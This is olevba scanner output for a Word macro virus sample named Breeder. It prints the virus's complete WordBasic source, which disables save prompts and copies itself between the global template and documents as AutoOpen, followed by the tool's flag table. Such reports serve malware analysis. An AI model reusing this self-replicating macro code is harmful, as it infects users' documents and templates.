olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Breeder-cede1f96f6cda731d0c975994033641ff72ccab7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Breeder-cede1f96f6cda731d0c975994033641ff72ccab7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Breeder-cede1f96f6cda731d0c975994033641ff72ccab7 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'  BREEDER BY -=>NEMESIS<=-  5/4/97
'  "DO NOT PROVOKE THE INTROVERT"

Public Sub MAIN()
Dim ThisFile$
Dim dlg As Object
Dim TheName$

On Error GoTo -1: On Error GoTo TheEnd
ThisFile$ = WordBasic.[MacroFileName$]()
If UCase(WordBasic.[Right$](ThisFile$, 4)) = ".DOT" Then
    Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs dlg
    TheName$ = WordBasic.[FileNameFromWindow$]()
    If TheName$ = "" Then
        WordBasic.Dialog.FileSaveAs dlg
        If dlg.Format = 0 Then dlg.Format = 1
    Else
        WordBasic.FileSaveAs Format:=1
    End If
        WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":AutoOpen"
        WordBasic.FileSaveAs dlg
Else
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    WordBasic.MacroCopy ThisFile$ + ":AutoOpen", "Global:FileSave"
End If

TheEnd:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

